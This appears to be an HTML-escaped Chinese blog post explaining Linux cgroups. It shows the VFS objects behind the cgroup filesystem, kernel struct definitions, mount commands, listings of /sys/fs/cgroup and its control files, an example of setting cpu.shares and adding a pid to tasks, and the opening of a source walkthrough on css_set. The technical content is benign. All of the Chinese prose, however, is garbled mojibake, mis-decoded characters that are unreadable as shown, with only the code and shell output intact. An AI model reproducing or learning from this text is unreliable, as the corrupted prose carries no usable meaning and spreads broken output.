&lt;li&gt;&lt;strong&gt;æ–‡ä»¶å¯¹è±¡&lt;/strong&gt;(file object)ï¼Œä¸€ä¸ªæ–‡ä»¶å¯¹è±¡è¡¨ç¤ºè¿›ç¨‹å†…æ‰“å¼€çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å¯¹è±¡æ˜¯å­˜æ”¾åœ¨è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦è¡¨é‡Œé¢çš„ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸­æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†æ˜¯ä¸€ä¸ªå« file_operations çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“æè¿°äº†å…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿçš„è¯»å†™å®ç°ã€‚å½“è¿›ç¨‹åœ¨æŸä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šè°ƒç”¨è¯»å†™æ“ä½œæ—¶ï¼Œå®é™…è°ƒç”¨çš„æ˜¯ file_operations ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚ å¯¹äºæ™®é€šçš„ç£ç›˜æ–‡ä»¶ç³»ç»Ÿï¼Œfile_operations ä¸­å®šä¹‰çš„å°±æ˜¯æ™®é€šçš„å—è®¾å¤‡è¯»å†™æ“ä½œï¼›å¯¹äºsocketæ–‡ä»¶ç³»ç»Ÿï¼Œfile_operations ä¸­å®šä¹‰çš„å°±æ˜¯ socket å¯¹åº”çš„ send/recv ç­‰æ“ä½œï¼›è€Œå¯¹äºcgroupsè¿™æ ·çš„ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œfile_operations ä¸­å®šä¹‰çš„å°±æ˜¯æ“ä½œ cgroup ç»“æ„ä½“ç­‰å…·ä½“çš„å®ç°ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›®å½•é¡¹å¯¹è±¡&lt;/strong&gt;(dentry object)ï¼Œåœ¨æ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå†…æ ¸åœ¨æŸ¥æ‰¾æŸä¸€ä¸ªè·¯å¾„ä¸­çš„æ–‡ä»¶æ—¶ï¼Œä¼šä¸ºå†…æ ¸è·¯å¾„ä¸Šçš„æ¯ä¸€ä¸ªåˆ†é‡éƒ½ç”Ÿæˆä¸€ä¸ªç›®å½•é¡¹å¯¹è±¡ï¼Œé€šè¿‡ç›®å½•é¡¹å¯¹è±¡èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”çš„ inode å¯¹è±¡ï¼Œç›®å½•é¡¹å¯¹è±¡ä¸€èˆ¬ä¼šè¢«ç¼“å­˜ï¼Œä»è€Œæé«˜å†…æ ¸æŸ¥æ‰¾é€Ÿåº¦ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;cgroupæ–‡ä»¶ç³»ç»Ÿçš„å®ç°&#34;&gt;&lt;strong&gt;cgroupæ–‡ä»¶ç³»ç»Ÿçš„å®ç°&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;åŸºäºVFSå®ç°çš„æ–‡ä»¶ç³»ç»Ÿï¼Œéƒ½å¿…é¡»å®ç°VFSé€šç”¨æ–‡ä»¶æ¨¡å‹å®šä¹‰çš„è¿™äº›å¯¹è±¡ï¼Œå¹¶å®ç°è¿™äº›å¯¹è±¡å®šä¹‰çš„éƒ¨åˆ†å‡½æ•°ã€‚cgroupæ–‡ä»¶ç³»ç»Ÿä¹Ÿä¸ä¾‹å¤–ã€‚&lt;/p&gt;
&lt;p&gt;cgroupæ–‡ä»¶ç³»ç»Ÿç±»å‹çš„ç»“æ„ä½“ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct file_system_type cgroup_fs_type = {
        .name = &amp;quot;cgroup&amp;quot;,
        .mount = cgroup_mount,
        .kill_sb = cgroup_kill_sb,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œé¢ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«ä»£è¡¨å®‰è£…å’Œå¸è½½æŸä¸€ä¸ª cgroup æ–‡ä»¶ç³»ç»Ÿæ‰€éœ€è¦æ‰§è¡Œçš„å‡½æ•°ã€‚æ¯æ¬¡æŠŠæŸä¸€ä¸ª cgroups å­ç³»ç»Ÿå®‰è£…åˆ°æŸä¸€ä¸ªè£…è½½ç‚¹çš„æ—¶å€™ï¼Œcgroup_mount æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šç”Ÿæˆä¸€ä¸ª cgroups_rootï¼ˆcgroupså±‚çº§ç»“æ„çš„æ ¹ï¼‰å¹¶å°è£…æˆè¶…çº§å¿«å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;cgroupè¶…çº§å—å¯¹è±¡å®šä¹‰çš„æ“ä½œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct super_operations cgroup_ops = {
        .statfs = simple_statfs,
        .drop_inode = generic_delete_inode,
        .show_options = cgroup_show_options,
        .remount_fs = cgroup_remount,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œåªæœ‰éƒ¨åˆ†å‡½æ•°çš„å®ç°ï¼Œè¿™æ˜¯å› ä¸ºå¯¹äºç‰¹å®šçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€ï¼Œæ‰€æ”¯æŒçš„æ“ä½œå¯èƒ½ä»…æ˜¯ super_operations ä¸­æ‰€å®šä¹‰æ“ä½œçš„ä¸€ä¸ªå­é›†ï¼Œæ¯”å¦‚è¯´å¯¹äºå—è®¾å¤‡ä¸Šçš„æ–‡ä»¶å¯¹è±¡ï¼Œè‚¯å®šæ˜¯æ”¯æŒç±»ä¼¼ fseek çš„æŸ¥æ‰¾æŸä¸ªä½ç½®çš„æ“ä½œï¼Œä½†æ˜¯å¯¹äº socket æˆ–è€… cgroups è¿™æ ·ç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œå°±ä¸æ”¯æŒè¿™æ ·çš„æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;inode&lt;/code&gt;å¯¹è±¡å’Œ&lt;code&gt;file&lt;/code&gt;å¯¹è±¡çš„å®šä¹‰çš„ç‰¹æ®Šå®ç°å‡½æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct inode_operations cgroup_dir_inode_operations = {
        .lookup = cgroup_lookup,
        .mkdir = cgroup_mkdir,
        .rmdir = cgroup_rmdir,
        .rename = cgroup_rename,
};
static const struct file_operations cgroup_file_operations = {
        .read = cgroup_file_read,
        .write = cgroup_file_write,
        .llseek = generic_file_llseek,
        .open = cgroup_file_open,
        .release = cgroup_file_release,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»è¿™äº›ä»£ç å¯ä»¥æ¨æ–­å‡ºï¼Œcgroups é€šè¿‡å®ç° VFS çš„é€šç”¨æ–‡ä»¶ç³»ç»Ÿæ¨¡å‹ï¼ŒæŠŠç»´æŠ¤ cgroups å±‚çº§ç»“æ„çš„ç»†èŠ‚ï¼Œéšè—åœ¨ cgroups æ–‡ä»¶ç³»ç»Ÿçš„è¿™äº›å®ç°å‡½æ•°ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä»å¦ä¸€ä¸ªæ–¹é¢è¯´ï¼Œç”¨æˆ·åœ¨ç”¨æˆ·æ€å¯¹ cgroups æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œï¼Œé€šè¿‡ VFS è½¬åŒ–ä¸ºå¯¹ cgroups å±‚çº§ç»“æ„çš„ç»´æŠ¤ã€‚é€šè¿‡è¿™æ ·çš„æ–¹å¼ï¼Œå†…æ ¸æŠŠ cgroups çš„åŠŸèƒ½æš´éœ²ç»™äº†ç”¨æˆ·æ€çš„è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ç®€å•ç”¨æ³•åŠè¯´æ˜&#34;&gt;ç®€å•ç”¨æ³•åŠè¯´æ˜&lt;/h2&gt;
&lt;h3 id=&#34;æŒ‚è½½cgroupæ–‡ä»¶ç³»ç»Ÿ&#34;&gt;æŒ‚è½½cgroupæ–‡ä»¶ç³»ç»Ÿ&lt;/h3&gt;
&lt;p&gt;å’Œæ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿä¸€æ ·ï¼Œcgroupæ–‡ä»¶ç³»ç»Ÿéœ€è¦å…ˆæŒ‚è½½ï¼Œé€šè¿‡&lt;code&gt;mount&lt;/code&gt;å‘½ä»¤æŒ‚è½½ cgroups æ–‡ä»¶ç³»ç»Ÿï¼Œæ ¼å¼ä¸º:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mount -t cgroup -o subsystems name /cgroup/name&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å…¶ä¸­&lt;code&gt;-t cgroup&lt;/code&gt;æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿç±»å‹ä¸ºcgroupç±»å‹ï¼Œ&lt;code&gt;-o subsystems&lt;/code&gt; è¡¨ç¤ºéœ€è¦å…³è”çš„cgroupså­ç³»ç»Ÿï¼Œå¯ä»¥ç”¨é€—å·éš”å¼€ï¼Œè¡¨ç¤ºåŒæ—¶æŒ‚è½½å¤šä¸ªå­ç³»ç»Ÿï¼Œ&lt;code&gt;name&lt;/code&gt;è¡¨ç¤ºå®ä¾‹çš„åç§°ï¼Œ&lt;code&gt;/cgroup/name&lt;/code&gt; è¡¨ç¤ºæŒ‚è½½ç‚¹ï¼Œè¿™æ¡å‘½ä»¤åŒæ—¶åœ¨å†…æ ¸ä¸­åˆ›å»ºäº†ä¸€ä¸ªcgroups å±‚çº§ç»“æ„ã€‚(ç›®å‰å¤§å¤šæ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶å·²ç»é»˜è®¤æŒ‚è½½&lt;code&gt;/sys/fs/cgroup&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚æŒ‚è½½ &lt;code&gt;cpuset, cpu, cpuacct, memory&lt;/code&gt; 4ä¸ª&lt;code&gt;subsystem&lt;/code&gt;åˆ°&lt;code&gt;/cgroup/cpu_and_mem&lt;/code&gt; ç›®å½•ä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨ &lt;code&gt;mount -t cgroup -o remount,cpu,cpuset,memory cpu_and_mem /cgroup/cpu_and_mem&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;cgroupæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯ç”¨æˆ·å¯ä»¥åŒæ—¶æŒ‚è½½å¤šä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯è¦ä¿è¯æ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿç”¨åˆ°çš„å­ç³»ç»Ÿæ²¡æœ‰é‡å ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå·²ç»æœ‰ä¸€ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½åŒ…å«äº†æŸä¸€ä¸ªå­ç³»ç»Ÿï¼Œå…¶å®ƒcgroupæ–‡ä»¶ç³»ç»Ÿå°±ä¸èƒ½åŒ…å«è¿™ä¸ªå­ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;ubuntuå’Œcentosçš„åšæ³•æ˜¯æ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½åŸºæœ¬åªåŒ…å«ä¸€ä¸ªå­ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/
total 0
drwxr-xr-x. 2 root root  0 May 25 04:19 blkio
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpu -&amp;gt; cpu,cpuacct
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpuacct -&amp;gt; cpu,cpuacct
drwxr-xr-x. 3 root root  0 May 25 04:19 cpu,cpuacct
drwxr-xr-x. 2 root root  0 May 25 04:19 cpuset
drwxr-xr-x. 2 root root  0 May 25 04:19 devices
drwxr-xr-x. 2 root root  0 May 25 04:19 freezer
drwxr-xr-x. 2 root root  0 May 25 04:19 hugetlb
drwxr-xr-x. 2 root root  0 May 25 04:19 memory
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_cls -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 net_cls,net_prio
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_prio -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 perf_event
drwxr-xr-x. 2 root root  0 May 25 04:19 pids
drwxr-xr-x. 4 root root  0 May 25 04:19 systemd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥CPUå­ç³»ç»Ÿæ‰€åœ¨çš„cgroupæ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/cpu/
total 0
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.clone_children
--w--w--w-. 1 root root 0 May 25 04:19 cgroup.event_control
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.procs
-r--r--r--. 1 root root 0 May 25 04:19 cgroup.sane_behavior
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.stat
-rw-r--r--. 1 root root 0 May 25 04:19 cpuacct.usage
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.usage_percpu
drwxr-xr-x. 3 root root 0 May 25 04:52 cpu_c1
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_quota_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_runtime_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.shares
-r--r--r--. 1 root root 0 May 25 04:19 cpu.stat
-rw-r--r--. 1 root root 0 May 25 04:19 notify_on_release
-rw-r--r--. 1 root root 0 May 25 04:19 release_agent
-rw-r--r--. 1 root root 0 May 25 04:19 tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ€»å…±åŒ…å«çš„æ–‡ä»¶å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç›®å½•ã€‚å†cgroupæ–‡ä»¶ç³»ç»Ÿä¸­ç›®å½•å¯¹åº”ä¸€ä¸ªå…·ä½“çš„cgroupã€‚&lt;/li&gt;
&lt;li&gt;é€šç”¨æ–‡ä»¶ã€‚ä»¥&lt;code&gt;cgroup.&lt;/code&gt;ä¸ºå‰ç¼€çš„æ–‡ä»¶å’Œä¸‰ä¸ªæ— å‰ç¼€çš„æ–‡ä»¶&lt;code&gt;notify_on_release, release_agent, tasks&lt;/code&gt;ï¼Œè¿™äº›é€šç”¨æ–‡ä»¶å†æ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿéƒ½ä¼šå‡ºç°ï¼Œæ— è®ºæŒ‡å®šçš„æ˜¯å“ªä¸ªå­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;li&gt;å­ç³»ç»Ÿä¸“æœ‰æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶æ˜¯é…ç½®å­ç³»ç»Ÿçš„æ¥å£ï¼Œå­ç³»ç»Ÿä¸åŒï¼Œæ–‡ä»¶ä¹Ÿä¸åŒã€‚ä¾‹å¦‚ä¸Šé¢çš„ä»¥&lt;code&gt;cpu.&lt;/code&gt;ä¸ºå‰ç¼€çš„æ–‡ä»¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åœ¨cgroupæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œåˆ›å»º(åˆ é™¤)ä¸€ä¸ªç›®å½•å°±æ˜¯åˆ›å»º(åˆ é™¤)ä¸€ä¸ªcgroupï¼Œåˆ›å»ºå®Œç›®å½•åï¼Œä¼šè‡ªåŠ¨äº§ç”Ÿå¾ˆå¤šæ–‡ä»¶ï¼Œåœ¨cgroupæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ä¸‹(åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­æ˜¯&lt;code&gt;/sys/fs/cgroup/cpu&lt;/code&gt;)çš„å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šå‡ºç°åœ¨cgroupæ–‡ä»¶ç³»ç»Ÿçš„ä¸‹çº§ç›®å½•ä¸­ï¼Œé™¤äº†å°‘æ•°åœ¨ä»£ç å®ç°ä¸­æ ‡è®°ä¸ºåªåœ¨æ ¹ç›®å½•ä¸­å‡ºç°çš„æ–‡ä»¶ï¼Œä¾‹å¦‚&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å„ä¸ªå­ç³»ç»Ÿçš„é€šç”¨æ–‡ä»¶ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;cgroup.procs&lt;/code&gt;&lt;br&gt;
æ­¤æ–‡ä»¶çš„å†…å®¹å’Œcgroupä¸­æ‰€æœ‰è¿›ç¨‹çš„è¿›ç¨‹å·å…³è”ã€‚è¿™é‡Œçš„è¿›ç¨‹å·å®é™…ä¸Šæ˜¯çº¿ç¨‹ç»„å·(thread group ID)ã€‚å‘è¿™ä¸ªæ–‡ä»¶å†™å…¥ä¸€ä¸ªçº¿ç¨‹ç»„å·ï¼Œå°±ä¼šæŠŠæ•´ä¸ªçº¿ç¨‹ç»„ä¸­çš„çº¿ç¨‹éƒ½åŠ å…¥æ­¤æ–‡ä»¶æ‰€å±çš„cgroupã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.clone_chidren&lt;/code&gt;&lt;br&gt;
è¿™ä¸ªæ–‡ä»¶å’Œä¸€ä¸ªæ ‡å¿—å…³è”ï¼Œè€Œæ­¤æ ‡å¿—åªè¢«&lt;code&gt;cpuset&lt;/code&gt;å­ç³»ç»Ÿä½¿ç”¨ã€‚å½“æ­¤æ ‡å¿—ä¸º1æ—¶ï¼Œåˆ›å»ºæ–°çš„æœ‰å…³&lt;code&gt;cpuset&lt;/code&gt;çš„cgroupæ—¶ï¼Œå­cgroupä»çˆ¶cgroupä¸­å¤åˆ¶&lt;code&gt;cpuset&lt;/code&gt;é…ç½®ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;&lt;br&gt;
æ˜¾ç¤ºcgroupæ–‡ä»¶ç³»ç»Ÿçš„&lt;code&gt;sane_behavior&lt;/code&gt;çš„çŠ¶æ€ã€‚éšç€å†…æ ¸æ§åˆ¶ç»„å­ç³»ç»Ÿçš„å¼€å‘ï¼Œä¸€äº›æ—§çš„åšæ³•ä¸å†åˆé€‚ï¼Œä½†æ˜¯ä¸ºäº†å…¼å®¹æ—§çš„åº”ç”¨åˆä¸å¥½å®Œå…¨æ¸…é™¤ã€‚äºæ˜¯å¼€å‘è€…æä¾›äº†ä¸€ä¸ªé€‰é¡¹&lt;code&gt;__DEVEL__sane_behavior&lt;/code&gt;ï¼Œä¾›æŒ‚è½½æ—¶ä½¿ç”¨ã€‚å¦‚æœæœ‰è¿™ä¸ªæŒ‚è½½é€‰é¡¹ï¼Œè€æ—§çš„ä¸åˆé€‚çš„ä»£ç é€»è¾‘å°±ä¸ä¼šå‡ºç°ï¼Œ&lt;code&gt;tasksã€notify_on_releaseã€release_agent&lt;/code&gt; è¿™ä¸‰ä¸ªæ–‡ä»¶ä¹Ÿä¸ä¼šå‡ºç°ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tasks&lt;/code&gt;&lt;br&gt;
æ—§æœºåˆ¶ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ã€‚æ­¤æ–‡ä»¶å…³è”æ§åˆ¶ç»„ä¸­æ‰€æœ‰çº¿ç¨‹çš„çº¿ç¨‹å·ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;notify_on_release&lt;/code&gt;&lt;br&gt;
æ—§æœºåˆ¶ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ã€‚é€šè¿‡å®ƒæ¥å­˜å– &lt;code&gt;notify_on_release&lt;/code&gt; æ ‡å¿—ã€‚å½“æ­¤æ ‡å¿—ä¸º 1 æ—¶ï¼Œåœ¨ cgroupé€€å‡ºæ—¶ï¼Œå†…æ ¸è¦é€šçŸ¥ç”¨æˆ·æ€ã€‚æ‰€è°“é€€å‡ºæ˜¯æŒ‡æ­¤ cgroup ä¸å†æœ‰è¿›ç¨‹ï¼Œä¹Ÿä¸å†æœ‰å­ cgroupã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;release_agent&lt;/code&gt;&lt;br&gt;
æ—§æœºåˆ¶ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ã€‚æ­¤æ–‡ä»¶ä¸­å­˜æœ‰ä¸€ä¸ªè·¯å¾„ï¼Œå½“å†…æ ¸éœ€è¦é€šçŸ¥ç”¨æˆ·æ€ cgroup é€€å‡ºäº‹ä»¶æ—¶ï¼Œå†…æ ¸è¿è¡Œæ­¤è·¯å¾„æ‰€æŒ‡çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å­èŠ‚ç‚¹å’Œè¿›ç¨‹&#34;&gt;å­èŠ‚ç‚¹å’Œè¿›ç¨‹&lt;/h3&gt;
&lt;p&gt;æŒ‚è½½æŸä¸€ä¸ªcgroupså­ç³»ç»Ÿåˆ°æŒ‚è½½ç‚¹ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡åœ¨æŒ‚è½½ç‚¹ä¸‹é¢å»ºç«‹æ–‡ä»¶å¤¹åˆ›å»ºcgroupså±‚çº§ç»“æ„ä¸­çš„èŠ‚ç‚¹ï¼Œå½“åˆ›å»ºå®Œæ–‡ä»¶å¤¹åï¼Œä¼šè‡ªåŠ¨åœ¨å…¶ä¸­åˆ›å»ºç›¸å…³çš„é…ç½®æ–‡ä»¶ã€‚åˆ›å»ºç›®å½•çš„åŠ¨ä½œä¹Ÿå°±æ˜¯åˆ›å»ºäº†ä¸‹ä¸ªå±‚çº§çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œè¿˜å¯ä»¥åœ¨è¿™ä¸ªç›®å½•ä¸­ç»§ç»­åˆ›å»ºç›®å½•ï¼Œå½¢æˆç¬¬ä¸‰å±‚çº§ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨ç›¸åº”çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šå…·ä½“çš„é…ç½®ã€‚ä¾‹å¦‚åœ¨&lt;code&gt;cpu.shares&lt;/code&gt;ä¸­å†™å…¥æ•´æ•°å€¼å¯ä»¥æ§åˆ¶è¯¥cgroupè·å¾—çš„æ—¶é—´ç‰‡ã€‚&lt;/p&gt;
&lt;p&gt;åˆ›å»ºå¹¶é…ç½®å®ŒèŠ‚ç‚¹åï¼Œå°†è¿›ç¨‹çš„pidå†™å…¥å­èŠ‚ç‚¹ä¸‹é¢çš„taskæ–‡ä»¶ä¸­å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# åœ¨cpuå±‚çº§åˆ›å»ºä¸€ä¸ªæ–°çš„cgroupèŠ‚ç‚¹
# å‘½åä¸ºcpu_c1
mkdir /cgroup/cpu/cpu_c1

# è®¾ç½®`cpu.shares`æ–‡ä»¶
# å°†cpu_c1ç›®å½•ä¸‹çš„cpu.sharesæ–‡ä»¶å€¼è®¾ä¸º2048ï¼Œè¿™æ ·åœ¨ç³»ç»Ÿå‡ºç°cpuäº‰æŠ¢æ—¶
# å±äºcpu_c1è¿™ä¸ªcgroupçš„è¿›ç¨‹å ç”¨èµ„æºæ˜¯å…¶å®ƒè¿›ç¨‹çš„2å€ã€‚
echo 2048 &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/cpu.shares

# å°†è¿›ç¨‹åŠ å…¥åˆ°`cpu_c1`è¿™ä¸ªcgroupèŠ‚ç‚¹ã€‚
echo pid &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥çœ‹å·²ç»æŒ‚è½½çš„cgroup&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;mount -t cgroup
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuacct,cpu)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,blkio)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,net_prio,net_cls)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,perf_event)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,freezer)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,hugetlb)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuset)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,memory)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æºç åˆ†æ&#34;&gt;æºç åˆ†æ&lt;/h2&gt;
&lt;p&gt;cgroupåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æè¿°å­ç³»ç»Ÿ(subsys)å’Œcgroupç­‰å¯¹è±¡ã€å’Œå®ƒä»¬çš„ä¾é™„å…³ç³»ç­‰æ•°æ®ç»“æ„ï¼›&lt;/li&gt;
&lt;li&gt;æä¾›ç»™ç”¨æˆ·ç©ºé—´çš„æ–‡ä»¶ç³»ç»Ÿæ¥å£ï¼›&lt;/li&gt;
&lt;li&gt;å„å­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æ•°æ®ç»“æ„&#34;&gt;æ•°æ®ç»“æ„&lt;/h3&gt;
&lt;h4 id=&#34;ä»»åŠ¡task&#34;&gt;ä»»åŠ¡(task)&lt;/h4&gt;
&lt;p&gt;taskå¯¹åº”linuxä¸­çš„è¿›ç¨‹ï¼Œtaskå’Œcgroupå®ä¾‹ä¹‹é—´æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ï¼Œcgroupå®ä¾‹å’Œå­ç³»ç»Ÿæ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œtaskå’Œå­ç³»ç»Ÿä¹Ÿæ˜¯å¤šå¯¹å¤šçš„å…³ç³»(taskå¯ä»¥ä¾é™„å¤šä¸ªcgroupï¼Œä¸€ä¸ªcgroupå¯èƒ½ä¾é™„äº†å¤šä¸ªå­ç³»ç»Ÿ)ã€‚&lt;/p&gt;
&lt;p&gt;è¦æè¿°è¿™äº›å…³ç³»ä¸å®¹æ˜“ï¼Œå¦‚æœtaské€šè¿‡å„cgroupæ¥å¼•ç”¨å„å­ç³»ç»Ÿå†ä»subsysè·å–åˆ°èµ„æºé™åˆ¶ï¼Œè¿™æ¯”è¾ƒä½æ•ˆã€‚&lt;strong&gt;å†…æ ¸ç”¨&lt;code&gt;css_set&lt;/code&gt;æ¥åŒ…å«å¤šä¸ªå­ç³»ç»Ÿçš„ç»„åˆï¼Œæ¯ä¸ªtaskå¯¹åº”è‹¥å¹²&lt;code&gt;css_set&lt;/code&gt;ç»“æ„ä½“ï¼Œå³é€šè¿‡&lt;code&gt;css_set&lt;/code&gt;çŸ¥é“å®ƒå—å“ªäº›é™åˆ¶&lt;/strong&gt;ï¼ŒåŠ å¿«äº†è®¿é—®é€Ÿåº¦ï¼Œè€Œä¸”å­ç³»ç»Ÿç»„åˆæ˜¯æœ‰é™çš„ï¼Œå‡å°‘äº†å†…æ ¸æ•°æ®ç»“æ„çš„å¤æ‚åº¦ã€‚&lt;/p&gt;
&lt;p&gt;å®é™…ä¸Šcss_setå°±æ˜¯è‹¥å¹²&lt;code&gt;cgroup_subsys_state&lt;/code&gt;å®ä¾‹çš„é›†åˆï¼Œè€Œæ¯ä¸ª&lt;code&gt;cgroup_subsys_state&lt;/code&gt;å®ä¾‹æè¿°äº†ä¸€ä¸ªå­ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;h5 id=&#34;css_set&#34;&gt;css_set&lt;/h5&gt;
